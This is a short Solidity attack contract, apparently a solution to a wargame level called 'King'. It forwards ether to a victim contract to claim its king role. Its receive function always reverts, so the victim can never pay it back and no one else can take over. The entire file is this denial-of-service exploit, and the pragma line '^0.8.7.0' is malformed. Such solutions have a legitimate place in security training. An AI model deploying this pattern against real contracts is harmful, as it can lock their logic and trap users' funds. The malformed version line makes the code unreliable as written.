// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7.0;

contract King {

    address payable public victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function becomeKing() public payable returns (bool) {
        (bool success ,) = victim.call{value: msg.value}("");
        return success;
    }

    receive() external payable {
        revert("No way!");
    }
}